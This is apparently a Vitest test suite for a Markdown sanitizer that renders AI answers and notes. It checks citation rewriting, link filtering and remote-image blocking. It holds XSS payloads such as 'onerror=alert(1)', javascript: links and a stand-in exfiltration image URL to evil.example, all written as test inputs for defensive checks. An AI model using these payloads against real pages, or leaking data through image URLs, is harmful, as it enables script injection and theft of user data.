import { describe, expect, it } from 'vitest'
import { unified } from 'unified'
import remarkParse from 'remark-parse'
import remarkGfm from 'remark-gfm'
import remarkRehype from 'remark-rehype'
import rehypeStringify from 'rehype-stringify'
import { rehypeCitations, rehypeSafe, safeHref } from '../safeHtml'

/** 和 AI 面板里一样的渲染链 */
const answer = (md: string, sources = 3) =>
  String(
    unified()
      .use(remarkParse)
      .use(remarkGfm)
      .use(remarkRehype)
      .use(rehypeSafe, { remoteImages: false })
      .use(rehypeCitations, (n: number) => n >= 1 && n <= sources)
      .use(rehypeStringify)
      .processSync(md),
  )
/** 和导出、回收站预览一样的渲染链 */
const note = (md: string) => String(unified().use(remarkParse).use(remarkGfm).use(remarkRehype).use(rehypeSafe, { remoteImages: true }).use(rehypeStringify).processSync(md))

/**
 * 结果里不能有活的事件属性、脚本标签或脚本地址。
 * 正文里的 `<` 会被转义成 &#x3C;，所以去掉属性值之后，出现的 `<字母` 一定是真正的标签。
 */
function expectInert(html: string) {
  // 属性值里的引号会被转义成 &#x22;，所以两个引号之间就是完整的属性值；里面的文字不算标签，先去掉再检查
  const tags = html.replace(/="[^"]*"/g, '=""')
  expect(tags).not.toMatch(/<[a-z][^>]*\son\w+\s*=/i)
  expect(tags).not.toMatch(/<(script|iframe|object|embed)\b/i)
  expect(html).not.toMatch(/(href|src)\s*=\s*"?\s*(javascript|vbscript|data:text)/i)
}

describe('citations in AI answers', () => {
  it('turns [n] in text into a citation link', () => {
    expect(answer('见这里[2]。')).toBe('<p>见这里<a class="cite" data-n="2">2</a>。</p>')
    expect(answer('a [1][3] b')).toContain('<a class="cite" data-n="1">1</a><a class="cite" data-n="3">3</a>')
  })

  it('leaves numbers without a matching source alone', () => {
    expect(answer('数组 a[9] 和 [0]')).toBe('<p>数组 a[9] 和 [0]</p>')
  })

  it('does not touch code or existing links', () => {
    expect(answer('`x[1]`')).toBe('<p><code>x[1]</code></p>')
    expect(answer('```\nlist[1]\n```')).toContain('list[1]')
    expect(answer('[text [1]](https://example.com)')).not.toContain('class="cite"')
  })

  // 审计发现的注入：以前在拼好的 HTML 字符串上替换 [n]，属性里的 [1] 被换成带引号的标签，属性提前闭合
  it('cannot be used to break out of an attribute', () => {
    for (const md of [
      '[t](http://x "[1]<img src=x onerror=alert(1)>")',
      '![[1]<img src=x onerror=alert(1)>](http://x)',
      '![a](x "[1]\\" onerror=\\"alert(1)")',
      '[[1]](http://x "[2]<svg onload=alert(1)>")',
    ]) {
      const html = answer(md)
      expectInert(html)
      // 除了引用编号自己的 <a class="cite">，没有多出别的标签
      const tags = (html.replace(/="[^"]*"/g, '=""').match(/<[a-z]+/gi) ?? []).filter((t) => !['<p', '<a', '<img'].includes(t.toLowerCase()))
      expect(tags).toEqual([])
      // 属性值里的 [1] 原样留着，没有被换成标签
      expect(html).not.toMatch(/="[^"]*<a class=/)
    }
  })
})

describe('untrusted HTML', () => {
  it('drops dangerous link targets but keeps the text', () => {
    for (const href of ['javascript:alert(1)', 'JaVaScRiPt:alert(1)', 'java\tscript:alert(1)', 'data:text/html,<script>1</script>', 'vbscript:x', 'vault://localhost/a.svg', 'file:///etc/passwd']) {
      expect(safeHref(href), href).toBe(false)
    }
    const html = note('[点我](javascript:alert(1)) <javascript:alert(2)>')
    expect(html).toContain('点我')
    expectInert(html)
    expect(html).not.toContain('href')
  })

  it('keeps ordinary links', () => {
    for (const href of ['https://example.com/a?b=1#c', 'http://example.com', 'mailto:a@b.c', 'tel:+123', '#section', '../other.md', 'notes/x.md', '/abs']) {
      expect(safeHref(href), href).toBe(true)
    }
    expect(note('[a](https://example.com)')).toBe('<p><a href="https://example.com">a</a></p>')
  })

  it('does not load remote images in AI answers', () => {
    const html = answer('![总结](https://evil.example/p?d=secret)')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('evil.example')
    expect(html).toContain('[总结]')
    expect(answer('![](https://evil.example/x.png)')).not.toContain('<img')
  })

  it('keeps local images in answers and all images in notes', () => {
    expect(answer('![a](assets/1.png)')).toContain('<img src="assets/1.png"')
    expect(answer('![a](data:image/png;base64,AAAA)')).toContain('<img')
    expect(note('![a](https://example.com/x.png)')).toContain('<img src="https://example.com/x.png"')
  })

  it('raw HTML in Markdown never becomes live markup', () => {
    for (const md of ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', 'a <b onclick="alert(1)">b</b>', '<iframe src="https://x"></iframe>']) {
      expectInert(answer(md))
      expectInert(note(md))
    }
  })
})
